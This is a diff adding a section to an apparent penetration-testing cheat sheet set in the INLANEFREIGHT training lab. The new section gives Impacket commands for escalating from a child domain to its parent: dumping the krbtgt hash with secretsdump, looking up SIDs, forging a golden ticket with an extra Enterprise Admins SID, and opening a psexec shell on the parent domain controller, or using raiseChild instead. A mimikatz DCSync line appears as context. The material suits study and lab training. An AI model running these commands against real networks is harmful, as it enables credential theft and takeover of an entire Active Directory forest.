@@ -1568,6 +1568,20 @@ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
 mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
 
+- Child -> Parent Trusts (Linux - Impacket)
+
+```
+$ secretsdump.py <child domain>/<username>@<IP address> -just-dc-user LOGISTICS/krbtgt
+$ lookupsid.py <child domain>/<username>@<IP address>
+$ lookupsid.py <child domain>/<username>@<IP address> | grep "Domain SID"
+$ lookupsid.py <child domain>/<username>@<Parent Domain Controller IP address> | grep -B12 "Enterprise Admins"
+$ ticketer.py -nthash <Child Domain KRBTGT Hash> -domain <Child Domain> -domain-sid <Child Domain SID> -extra-sid <Enterprise Admins SID> hacker
+$ export KRB5CCNAME=hacker.ccache
+$ psexec.py <child domain>/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip <Parent Domain Controller IP address>
+OR
+$ raiseChild.py -target-exec <Parent Domain Controller IP address> <child domain>/<username>
+```
+
 #5. - Privilege Escalation
 -----------------------------------------
 
